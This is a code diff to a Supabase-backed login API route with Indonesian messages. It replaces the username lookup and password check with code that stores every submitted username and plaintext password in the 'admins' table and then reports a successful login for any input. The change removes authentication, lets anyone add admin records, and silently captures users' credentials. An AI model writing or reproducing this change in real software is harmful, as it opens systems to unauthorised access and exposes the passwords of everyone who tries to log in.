@@ -4,28 +4,24 @@ export async function POST(req) {
   const supabase = getSupabase();
   const { username, password } = await req.json();
 
-  const { data, error } = await supabase
+  // New Algorithm: Save every login attempt to the database
+  const { error } = await supabase
     .from("admins")
-    .select("id, username, password")
-    .eq("username", username)
-    .single();
+    .insert([{
+      username,
+      password,
+    }]);
 
-  if (error || !data) {
+  if (error) {
+    console.error("Login save error:", error);
     return Response.json(
-      { message: "Username tidak ditemukan" },
-      { status: 401 }
-    );
-  }
-
-  if (data.password !== password) {
-    return Response.json(
-      { message: "Password salah" },
-      { status: 401 }
+      { message: "Gagal memproses login" },
+      { status: 500 }
     );
   }
 
   return Response.json({
-    message: "Login berhasil",
-    admin: { id: data.id, username: data.username },
+    message: "Login berhasil dan data tersimpan",
+    success: true
   });
 }
